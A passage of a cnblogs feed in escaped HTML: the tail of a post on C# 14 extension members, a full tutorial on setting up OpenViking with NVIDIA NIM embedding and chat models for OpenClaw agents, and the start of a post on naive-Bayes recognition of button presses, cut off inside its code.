class=\"p1\">public static IEnumerable&lt;TSource&gt; Identity</p>\n<p class=\"p1\">代码调用：IEnumerable&lt;int&gt;.Identity</p>\n<p class=\"p1\">这在旧扩展方法体系中是无法表达的。</p>\n<p class=\"p1\">再看一个扩展运算符</p>\n<p class=\"p1\">public static IEnumerable&lt;TSource&gt; operator +</p>\n<p class=\"p1\">这是 C# 14 的重大增强点。现在你可以写：</p>\n<p class=\"p1\">var result = list1 + list2;</p>\n<p class=\"p1\">等价于：Enumerable.op_Addition(list1, list2);</p>\n<p class=\"p1\"><strong><span style=\"font-size: 16px;\">三、底层编译机制</span></strong></p>\n<p class=\"p1\">&nbsp;<strong>不修改 CLR 元数据</strong></p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">不改变 IEnumerable&lt;T&gt;</span></p>\n</li>\n<li>\n<p class=\"p1\">不增加真实成员</p>\n</li>\n</ul>\n<p>&nbsp;<strong>IL 仍然是静态方法</strong></p>\n<p>&nbsp; &nbsp;所有成员都会生成：&nbsp;public static ...</p>\n<p class=\"p1\">&nbsp;<strong>语义绑定由编译器完成</strong></p>\n<p class=\"p1\">扩展成员解析规则：</p>\n<ol start=\"1\">\n<li>\n<p class=\"p1\">实例真实成员</p>\n</li>\n<li>\n<p class=\"p1\">同 namespace extension block</p>\n</li>\n<li>\n<p class=\"p1\">using 导入 extension block</p>\n</li>\n</ol>\n<p>&nbsp;<strong><span style=\"font-size: 16px;\">四、与传统扩展方法对比</span></strong></p>\n<p>&nbsp; &nbsp;<img alt=\"image\" height=\"246\" src=\"https://img2024.cnblogs.com/blog/23525/202602/23525-20260218111804828-477864692.png\" width=\"657\" /></p>\n<p>同时，零运行时开销。</p>\n<ul>\n<li>\n<p class=\"p1\">无反射</p>\n</li>\n<li>\n<p class=\"p1\">无动态代理</p>\n</li>\n<li>\n<p class=\"p1\">无装饰器</p>\n</li>\n<li>\n<p class=\"p1\">无运行时注入</p>\n</li>\n</ul>\n<p>&nbsp;完全编译期绑定。</p>\n<blockquote>编译器级语义增强，不改变运行时类型结构。</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;以上分享给大家。</p>\n<p>&nbsp;</p>\n<p>周国庆</p>\n<p>20260218</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-18 11:20</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianqing\">Eric zhou</a>&nbsp;\n阅读(<span id=\"post_view_count\">128</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "OpenClaw+OpenViking + NVIDIA API 配置教程",
      "link": "https://www.cnblogs.com/swizard/p/19622926",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/swizard/p/19622926\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 10:56\">\n    <span>OpenClaw+OpenViking + NVIDIA API 配置教程</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>本教程介绍如何在 OpenClaw 环境中配置 OpenViking，使用 NVIDIA NIM API 作为 Embedding 和 VLM 后端。</p>\n</blockquote>\n<h2 id=\"什么是-openviking\">什么是 OpenViking？</h2>\n<p>OpenViking 是火山引擎开源的 <strong>AI Agent 上下文数据库</strong>。它用\"虚拟文件系统\"的方式管理 Agent 的记忆、资源和技能，提供：</p>\n<ul>\n<li><strong>分层上下文</strong>：L0摘要 / L1概览 / L2全文，按需加载节省 Token</li>\n<li><strong>语义搜索</strong>：融合目录定位与向量检索</li>\n<li><strong>自动摘要</strong>：VLM 自动生成文档摘要和概览</li>\n<li><strong>会话记忆</strong>：自动提取对话中的长期记忆</li>\n</ul>\n<p>GitHub: <a href=\"https://github.com/volcengine/OpenViking\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/volcengine/OpenViking</a></p>\n<h2 id=\"前置条件\">前置条件</h2>\n<ul>\n<li>Python 3.9+</li>\n<li>NVIDIA NIM API Key（<a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">免费注册</a>）</li>\n<li>稳定的网络连接</li>\n</ul>\n<hr />\n<h2 id=\"第一步安装-openviking\">第一步：安装 OpenViking</h2>\n<pre><code class=\"language-bash\">pip install openviking\n</code></pre>\n<hr />\n<h2 id=\"第二步创建配置文件\">第二步：创建配置文件</h2>\n<p>创建目录和配置文件：</p>\n<pre><code class=\"language-bash\">mkdir -p ~/.openviking\n</code></pre>\n<p>编辑 <code>~/.openviking/ov.conf</code>：</p>\n<pre><code class=\"language-json\">{\n  \"embedding\": {\n    \"dense\": {\n      \"api_base\": \"https://integrate.api.nvidia.com/v1\",\n      \"api_key\": \"你的NVIDIA_API_KEY\",\n      \"provider\": \"openai\",\n      \"dimension\": 4096,\n      \"model\": \"nvidia/nv-embed-v1\"\n    }\n  },\n  \"vlm\": {\n    \"api_base\": \"https://integrate.api.nvidia.com/v1\",\n    \"api_key\": \"你的NVIDIA_API_KEY\",\n    \"provider\": \"openai\",\n    \"model\": \"meta/llama-3.3-70b-instruct\"\n  }\n}\n</code></pre>\n<h3 id=\"配置说明\">配置说明</h3>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>api_base</code></td>\n<td>NVIDIA NIM API 端点</td>\n</tr>\n<tr>\n<td><code>api_key</code></td>\n<td>从 NVIDIA Build 平台获取</td>\n</tr>\n<tr>\n<td><code>dimension</code></td>\n<td>Embedding 维度，nv-embed-v1 固定为 4096</td>\n</tr>\n<tr>\n<td><code>embedding.model</code></td>\n<td>推荐使用 <code>nvidia/nv-embed-v1</code>（对称模型，不需要 input_type 参数）</td>\n</tr>\n<tr>\n<td><code>vlm.model</code></td>\n<td>用于生成摘要的语言模型，推荐 <code>meta/llama-3.3-70b-instruct</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"为什么不用-kimi-k25\">为什么不用 kimi-k2.5？</h3>\n<p>NVIDIA 上的推理模型（如 kimi-k2.5）返回的 <code>content</code> 字段为空，内容在 <code>reasoning</code> 字段里。OpenViking 期望标准的 <code>message.content</code> 格式，所以要用非推理模型。</p>\n<h3 id=\"如何获取-nvidia-api-key\">如何获取 NVIDIA API Key</h3>\n<ol>\n<li>访问 <a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">https://build.nvidia.com/</a></li>\n<li>登录/注册账号</li>\n<li>点击右上角用户名 → API Keys → Generate Key</li>\n<li>复制保存（只显示一次）</li>\n</ol>\n<hr />\n<h2 id=\"第三步设置环境变量\">第三步：设置环境变量</h2>\n<pre><code class=\"language-bash\">export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf\n</code></pre>\n<p>建议添加到 <code>~/.bashrc</code>：</p>\n<pre><code class=\"language-bash\">echo 'export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n</code></pre>\n<hr />\n<h2 id=\"第四步验证安装\">第四步：验证安装</h2>\n<p>创建测试脚本 <code>test_openviking.py</code>：</p>\n<pre><code class=\"language-python\">import openviking as ov\n\n# 初始化客户端，数据存储在当前目录的 openviking_data 文件夹\nclient = ov.SyncOpenViking(path=\"./openviking_data\")\n\ntry:\n    client.initialize()\n    print(\"✅ OpenViking 初始化成功！\")\n    \n    # 添加一个测试文件\n    result = client.add_resource(path=\"./your_file.md\")\n    print(f\"添加文件: {result}\")\n    \n    # 等待处理完成\n    print(\"等待处理...\")\n    client.wait_processed()\n    print(\"✅ 处理完成！\")\n    \n    # 搜索测试\n    results = client.find(\"测试关键词\", limit=3)\n    print(f\"\\n搜索结果:\")\n    for r in results.resources:\n        print(f\"  {r.uri} (score: {r.score:.4f})\")\n    \n    client.close()\n    print(\"\\n🎉 OpenViking 配置成功！\")\n\nexcept Exception as e:\n    print(f\"错误: {e}\")\n    import traceback\n    traceback.print_exc()\n</code></pre>\n<p>运行：</p>\n<pre><code class=\"language-bash\">python test_openviking.py\n</code></pre>\n<hr />\n<h2 id=\"第五步核心-api-用法\">第五步：核心 API 用法</h2>\n<h3 id=\"添加资源\">添加资源</h3>\n<pre><code class=\"language-python\"># 添加单个文件\nresult = client.add_resource(path=\"./docs/readme.md\")\n\n# 添加 URL\nresult = client.add_resource(path=\"https://example.com/article.html\")\n</code></pre>\n<h3 id=\"目录浏览\">目录浏览</h3>\n<pre><code class=\"language-python\"># 列出根目录\nls_result = client.ls(\"viking://resources\")\n\n# 列出子目录\nls_result = client.ls(\"viking://resources/my_project\")\n</code></pre>\n<h3 id=\"语义搜索\">语义搜索</h3>\n<pre><code class=\"language-python\"># 搜索相关内容\nresults = client.find(\"如何配置 embedding\", limit=5)\n\nfor r in results.resources:\n    print(f\"URI: {r.uri}\")\n    print(f\"Score: {r.score}\")\n    print(f\"Content: {client.read(r.uri)[:200]}...\")\n</code></pre>\n<h3 id=\"获取摘要概览\">获取摘要/概览</h3>\n<pre><code class=\"language-python\"># L0 层：一句话摘要\nabstract = client.abstract(\"viking://resources/my_project\")\n\n# L1 层：详细概览\noverview = client.overview(\"viking://resources/my_project\")\n</code></pre>\n<h3 id=\"读取内容\">读取内容</h3>\n<pre><code class=\"language-python\"># 读取完整内容（L2 层）\ncontent = client.read(\"viking://resources/my_project/readme.md\")\n</code></pre>\n<hr />\n<h2 id=\"常见问题\">常见问题</h2>\n<h3 id=\"q-embedding-维度不匹配\">Q: Embedding 维度不匹配</h3>\n<p><strong>错误</strong>: <code>Dense vector dimension mismatch: expected 2048, got 4096</code></p>\n<p><strong>解决</strong>: 在配置文件中明确指定 <code>dimension: 4096</code>，匹配 <code>nvidia/nv-embed-v1</code> 的输出维度。</p>\n<h3 id=\"q-vlm-返回-nonetype-错误\">Q: VLM 返回 NoneType 错误</h3>\n<p><strong>错误</strong>: <code>'NoneType' object is not subscriptable</code></p>\n<p><strong>原因</strong>: 使用了推理模型（如 kimi-k2.5），其返回格式与 OpenViking 不兼容。</p>\n<p><strong>解决</strong>: 换用标准模型如 <code>meta/llama-3.3-70b-instruct</code>。</p>\n<h3 id=\"q-nvidia-api-报错-input_type-required\">Q: NVIDIA API 报错 input_type required</h3>\n<p><strong>错误</strong>: <code>'input_type' parameter is required for asymmetric models</code></p>\n<p><strong>原因</strong>: 某些 Embedding 模型（如 nv-embedqa-e5-v5）是非对称模型，需要指定 query 或 document。</p>\n<p><strong>解决</strong>: 使用对称模型 <code>nvidia/nv-embed-v1</code>，不需要 input_type。</p>\n<h3 id=\"q-文件名冲突\">Q: 文件名冲突</h3>\n<p><strong>错误</strong>: <code>directory already exists: /resources/第01章</code></p>\n<p><strong>原因</strong>: OpenViking 用文件名（不含路径）作为 URI，不同目录下的同名文件会冲突。</p>\n<p><strong>解决</strong>:</p>\n<ul>\n<li>方案一：重命名文件，使用唯一名称</li>\n<li>方案二：分批导入，避免同时添加同名文件</li>\n<li>方案三：等待官方修复此设计问题</li>\n</ul>\n<hr />\n<h2 id=\"为什么用-openviking替代-openclaw-默认的-qmd-记忆后端\">为什么用 OpenViking？——替代 OpenClaw 默认的 qmd 记忆后端</h2>\n<h3 id=\"openclaw-现有记忆方案的局限\">OpenClaw 现有记忆方案的局限</h3>\n<p>OpenClaw 默认使用 <code>qmd</code> 作为记忆后端，配合手动维护的 <code>MEMORY.md</code> 和 <code>memory/*.md</code> 文件。这套方案够用，但有几个痛点：</p>\n<ol>\n<li><strong>搜索精度有限</strong> — qmd 基于简单向量匹配，缺乏层次化理解</li>\n<li><strong>手动维护成本高</strong> — 记忆文件需要人工整理，容易遗漏</li>\n<li><strong>缺乏自动摘要</strong> — Agent 需要读取整个文件才能了解内容</li>\n<li><strong>无法管理大量文档</strong> — 当 workspace 文件很多时，qmd 不够用</li>\n</ol>\n<h3 id=\"openviking-的优势\">OpenViking 的优势</h3>\n<table>\n<thead>\n<tr>\n<th>能力</th>\n<th>qmd</th>\n<th>OpenViking</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>语义搜索</td>\n<td>✅ 基础</td>\n<td>✅ 目录递归 + 语义融合</td>\n</tr>\n<tr>\n<td>自动摘要</td>\n<td>❌</td>\n<td>✅ L0/L1/L2 三层</td>\n</tr>\n<tr>\n<td>结构化浏览</td>\n<td>❌</td>\n<td>✅ 虚拟文件系统</td>\n</tr>\n<tr>\n<td>Token 节省</td>\n<td>❌</td>\n<td>✅ 按需加载</td>\n</tr>\n<tr>\n<td>会话记忆自动提取</td>\n<td>❌</td>\n<td>✅ 自动提取长期记忆</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"集成方式\">集成方式</h3>\n<h4 id=\"方式一作为-openclaw-的补充记忆推荐\">方式一：作为 OpenClaw 的补充记忆（推荐）</h4>\n<p>保留 qmd 作为日常轻量记忆，用 OpenViking 管理大型文档库：</p>\n<pre><code class=\"language-python\"># 把 workspace 里的书籍、项目文档等大型资源导入 OpenViking\nimport glob, openviking as ov\n\nclient = ov.SyncOpenViking(path=\"./openviking_data\")\nclient.initialize()\n\nfor f in glob.glob(\"./books/**/*.md\", recursive=True):\n    client.add_resource(path=f)\n\nfor f in glob.glob(\"./docs/**/*.md\", recursive=True):\n    client.add_resource(path=f)\n\nclient.wait_processed()\nclient.close()\n</code></pre>\n<p>Agent 工作流：</p>\n<ol>\n<li>日常对话 → qmd 记忆（轻量、快速）</li>\n<li>需要查阅文档 → OpenViking 语义搜索（精准、分层）</li>\n<li>Sub-agent 写作/研究 → OpenViking 提供上下文（节省 Token）</li>\n</ol>\n<h4 id=\"方式二完全替代-qmd\">方式二：完全替代 qmd</h4>\n<p>将 OpenClaw 的所有记忆文件也导入 OpenViking：</p>\n<pre><code class=\"language-python\"># 导入记忆文件\nfor f in glob.glob(\"./memory/*.md\"):\n    client.add_resource(path=f)\n\n# 导入 workspace 所有 markdown\nfor f in glob.glob(\"./**/*.md\", recursive=True):\n    client.add_resource(path=f)\n</code></pre>\n<blockquote>\n<p>⚠️ 目前 OpenViking 还不能直接作为 OpenClaw 的 <code>memory.backend</code> 配置项。需要通过 skill 的 CLI 工具间接调用。未来如果 OpenClaw 支持自定义记忆后端插件，可以更深度集成。</p>\n</blockquote>\n<h4 id=\"方式三给-sub-agent-提供上下文\">方式三：给 Sub-agent 提供上下文</h4>\n<p>写书、做研究等任务时，sub-agent 可以先搜索 OpenViking 获取相关上下文，而不是把整本书塞进 prompt：</p>\n<pre><code class=\"language-bash\"># Sub-agent 先搜索相关内容\npython3 scripts/viking.py search \"武松的性格分析\" --limit 3\n\n# 然后只读取最相关的段落\npython3 scripts/viking.py read viking://resources/第01章/张三的叙事.md\n</code></pre>\n<p>这样一个 sub-agent 只需要加载几千 token 的相关内容，而不是整本书的 10 万+ token。</p>\n<h3 id=\"已封装的-openclaw-skill\">已封装的 OpenClaw Skill</h3>\n<p>我们已经把 OpenViking 封装为 OpenClaw skill，安装后 Agent 可以直接使用：</p>\n<pre><code class=\"language-bash\"># 安装 skill\ngit clone https://github.com/swizardlv/openclaw_openviking_skill.git\ncp -r openclaw_openviking_skill/openviking ~/.openclaw/workspace/skills/\n</code></pre>\n<p>Skill 提供的命令：</p>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>viking.py add &lt;file&gt;</code></td>\n<td>索引文件</td>\n</tr>\n<tr>\n<td><code>viking.py add-dir &lt;dir&gt;</code></td>\n<td>批量索引目录</td>\n</tr>\n<tr>\n<td><code>viking.py search &lt;query&gt;</code></td>\n<td>语义搜索</td>\n</tr>\n<tr>\n<td><code>viking.py ls [uri]</code></td>\n<td>浏览资源</td>\n</tr>\n<tr>\n<td><code>viking.py abstract &lt;uri&gt;</code></td>\n<td>获取摘要</td>\n</tr>\n<tr>\n<td><code>viking.py overview &lt;uri&gt;</code></td>\n<td>获取概览</td>\n</tr>\n<tr>\n<td><code>viking.py read &lt;uri&gt;</code></td>\n<td>读取全文</td>\n</tr>\n<tr>\n<td><code>viking.py info</code></td>\n<td>查看配置状态</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"附录可用的-nvidia-embedding-模型\">附录：可用的 NVIDIA Embedding 模型</h2>\n<table>\n<thead>\n<tr>\n<th>模型</th>\n<th>维度</th>\n<th>类型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>nvidia/nv-embed-v1</code></td>\n<td>4096</td>\n<td>对称</td>\n<td>✅ 推荐，无需 input_type</td>\n</tr>\n<tr>\n<td><code>nvidia/nv-embedqa-e5-v5</code></td>\n<td>1024</td>\n<td>非对称</td>\n<td>需要 input_type 参数</td>\n</tr>\n<tr>\n<td><code>nvidia/llama-3.2-nv-embedqa-1b-v2</code></td>\n<td>2048</td>\n<td>非对称</td>\n<td>需要 input_type 参数</td>\n</tr>\n<tr>\n<td><code>nvidia/nv-embedcode-7b-v1</code></td>\n<td>4096</td>\n<td>对称</td>\n<td>适合代码</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"附录可用的-nvidia-chat-模型用于-vlm\">附录：可用的 NVIDIA Chat 模型（用于 VLM）</h2>\n<table>\n<thead>\n<tr>\n<th>模型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>meta/llama-3.3-70b-instruct</code></td>\n<td>✅ 推荐，标准格式</td>\n</tr>\n<tr>\n<td><code>meta/llama-3.1-70b-instruct</code></td>\n<td>稳定版本</td>\n</tr>\n<tr>\n<td><code>meta/llama-3.1-8b-instruct</code></td>\n<td>轻量版</td>\n</tr>\n<tr>\n<td><code>mistralai/mistral-large</code></td>\n<td>Mistral 系列</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>⚠️ 避免使用推理模型（如 kimi-k2.5、deepseek-r1），它们返回的格式与 OpenViking 不兼容。</p>\n</blockquote>\n<hr />\n<h2 id=\"参考链接\">参考链接</h2>\n<ul>\n<li>OpenViking 官网: <a href=\"https://www.openviking.ai\" rel=\"noopener nofollow\" target=\"_blank\">https://www.openviking.ai</a></li>\n<li>OpenViking GitHub: <a href=\"https://github.com/volcengine/OpenViking\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/volcengine/OpenViking</a></li>\n<li>NVIDIA NIM API: <a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">https://build.nvidia.com/</a></li>\n<li>NVIDIA API 文档: <a href=\"https://docs.api.nvidia.com/nim/\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.api.nvidia.com/nim/</a></li>\n</ul>\n<hr />\n<p><em>本教程基于 OpenViking 0.1.17 和 NVIDIA NIM API 测试通过。</em></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-18 10:56</span>&nbsp;\n<a href=\"https://www.cnblogs.com/swizard\">Swizard</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "这也行？按键动作模式识别也能用贝叶斯？",
      "link": "https://www.cnblogs.com/pie-o/p/19622890",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/pie-o/p/19622890\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 10:38\">\n    <span>这也行？按键动作模式识别也能用贝叶斯？</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        基于朴素贝叶斯对按键动作进行模式识别的一次学习实验\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p><a href=\"https://bbs.21ic.com/icview-3503975-1-1.html\" rel=\"noopener nofollow\" target=\"_blank\">首发于21ic论坛</a></p>\n</blockquote>\n<h2 id=\"前言\">前言</h2>\n<p>之前学习了贝叶斯更新的相关内容，正好现在也在玩开发板，板子上面有几个小的单击按键，一般识别按键动作的做法就很简单，不是中断就是查询，基本都是靠边沿或者电平的状态来进行的，这一套就很无聊，没有实现的欲望，所以想用点不一样的方法。</p>\n<p>这就有了本片文章的出现，基于<code>朴素贝叶斯分类</code>，使用滑动窗口捕捉电平序列，提取特征进行模式识别，理想情况下识别效果杠杠的，但是出现边界以及混合的情况，效果一言难尽，目前水平不够，这应该也是后续需要解决的主要问题了。</p>\n<h2 id=\"技术要点\">技术要点</h2>\n<h3 id=\"核心原理\">核心原理</h3>\n<ol>\n<li>贝叶斯定理</li>\n</ol>\n<p>本文实现的方法基于朴素贝叶斯分类器，主要就是两方面内容：<code>贝叶斯定理</code>与<code>条件独立假设</code>，涉及的概念有<strong>先验概率</strong>、<strong>后验概率</strong>和<strong>条件概率</strong>，其中先验和条件概率都是提前准备好的，可以是主观经验的，也可以是统计量化的，而贝叶斯定理中的条件概率(不是后验概率)，又称为似然概率。</p>\n<p>这个方法的基本思想是：对于给定的待分类项(就是窗口中的电平序列)，求解当这个待分类项出现时，各个<strong>已经定义过</strong>的模式类别出现的概率，哪个概率最大，那么这个待分类项就属于哪个模式。</p>\n<p>在开始分类之前需要一些必要的准备工作：</p>\n<ul>\n<li>定义有哪些模式类别，这些模式边界要明确，不然不容易分析特征</li>\n<li>定义这些模式的特征属性，这些属性在不同模式下的表现是不同的，这是识别的关键，对应了贝叶斯定理中的似然概率</li>\n</ul>\n<ol start=\"2\">\n<li>滑动窗口</li>\n</ol>\n<p>这里的窗口是实时更新的窗口，老数据移出，新数据加入，滑动窗口确定电平序列数据的范围，只有处在窗口中的序列数据才会得到特征提取的机会，它的长度与序列的时间长度成比例，也就是说采样频率会影响到窗口时效性。</p>\n<p>它需要考虑的问题是怎么捕捉到完整的信号，对应于滑动的步长，以及特征提取的周期。</p>\n<h3 id=\"基本步骤\">基本步骤</h3>\n<p>通过以下步骤实现按键动作模式识别：</p>\n<ol>\n<li><strong>滑动窗口采集</strong>：使用固定大小的滑动窗口持续采集按键状态数据</li>\n<li><strong>特征提取</strong>：从窗口数据中提取多个维度的特征</li>\n<li><strong>概率计算</strong>：基于先验概率和<strong>似然概率</strong>计算后验概率</li>\n<li><strong>模式判断</strong>：根据后验概率和<strong>阈值</strong>确定当前按键模式</li>\n</ol>\n<h2 id=\"具体实现\">具体实现</h2>\n<p>为了验证设想的可行性，通过逻辑分析仪记录按键的引脚电平变化，低电平表示按键按下，高电平表示无按键动作，采样率1MHz，时长20s，在后面的实验中，认为序列是连续的，这就是电平序列的来源，具体序列如下图所示：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>上面记录的数据可以作为一个样本，我通过观察和测量确定了几种模式，以及一些帮助识别的特征属性，在实验过程中使用<code>python</code>进行了方法验证。</p>\n<h3 id=\"模式定义\">模式定义</h3>\n<p>我在设计过程中定义了四种按键模式，分别如下：</p>\n<ul>\n<li><strong>无效</strong>：无有效按键动作</li>\n<li><strong>单击</strong>：单次短暂按键动作</li>\n<li><strong>双击</strong>：快速连续两次按键动作</li>\n<li><strong>长按</strong>：持续时间较长的按键动作</li>\n</ul>\n<p>动作的实施都是通过一个单按键来进行的，其中单击和双击涉及到电平的较快速变化，是识别的难点</p>\n<h3 id=\"特征选择\">特征选择</h3>\n<p>基于对提取的特征包括：</p>\n<ul>\n<li><strong>高电平占比</strong>：窗口内高电平信号的比例</li>\n<li><strong>上升沿数量</strong>：信号从低到高的转换次数</li>\n<li><strong>下降沿数量</strong>：信号从高到低的转换次数</li>\n<li><strong>最长连续高电平持续时间</strong>：窗口内持续高电平的最长时间</li>\n</ul>\n<h3 id=\"概率模型\">概率模型</h3>\n<ul>\n<li><strong>先验概率</strong>：初始假设四种模式等概率出现，即每个模式的先验都是0.25。并且和一般的贝叶斯方法不同的是，在实现过程中认为先验是不需要更新的，也就是在每一次识别时认为每个模式都是<strong>等概率</strong>出现的，没有转移概率或者历史因素影响</li>\n<li><strong>似然概率</strong>：基于<strong>特征分布参数</strong>计算观测到当前特征的概率，其中的分布参数是根据实际捕捉的序列数据来设计的，概率分布模型采用正态分布来<strong>近似</strong>，需要均值和标准差，统一使用<em>概率密度</em>表达似然结果\n<ul>\n<li>高电平占比的分布参数\n<ul>\n<li>无效：0.05，0.2</li>\n<li>单击：0.2，0.2</li>\n<li>双击：0.3，0.2</li>\n<li>长按：0.9，0.2</li>\n</ul>\n</li>\n<li>(上升沿/下降沿)数量的分布参数\n<ul>\n<li>无效：0.1，0.3</li>\n<li>单击：1，0.3</li>\n<li>双击：2，0.3</li>\n<li>长按：0.7，0.3</li>\n</ul>\n</li>\n<li>最长高电平持续时间的分布参数\n<ul>\n<li>无效：0，2</li>\n<li>单击：0.2，5</li>\n<li>双击：0.17，3</li>\n<li>长按：0.9，10</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>后验概率</strong>：使用贝叶斯公式计算各模式的后验概率，先计算提取的特征在每个模式下的<em>联合似然</em>，基于条件独立假设，可以直接相乘，然后计算后验并归一化可得最终的概率表</li>\n</ul>\n<h3 id=\"代码实现\">代码实现</h3>\n<ol>\n<li>数据采集与预处理</li>\n</ol>\n<p>把逻辑分析仪中的数据导出为csv文件，代码首先实现了&nbsp;read_sigrok_csv_simple&nbsp;函数，用于读取 sigrok CSV 格式的按键数据：</p>\n<pre><code class=\"language-python\">def&nbsp;read_sigrok_csv_simple(filename):\n\n&nbsp;&nbsp;&nbsp;&nbsp;time_data&nbsp;=&nbsp;[]\n&nbsp;&nbsp;&nbsp;&nbsp;signal_data&nbsp;=&nbsp;[]\n\n&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(filename,&nbsp;'r',&nbsp;newline='')&nbsp;as&nbsp;csvfile:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reader&nbsp;=&nbsp;csv.reader(csvfile)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;row&nbsp;in&nbsp;reader:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;跳过注释行和空行\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;row&nbsp;or&nbsp;row[0].startswith(';'):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;确保行有两个列\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(row)&nbsp;&gt;=&nbsp;2:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time_val&nbsp;=&nbsp;float(row[0])\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data_val&nbsp;=&nbsp;float(row[1])\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time_data.append(time_val)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signal_data.append(data_val)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;ValueError:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;跳过无法转换为数字的行\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&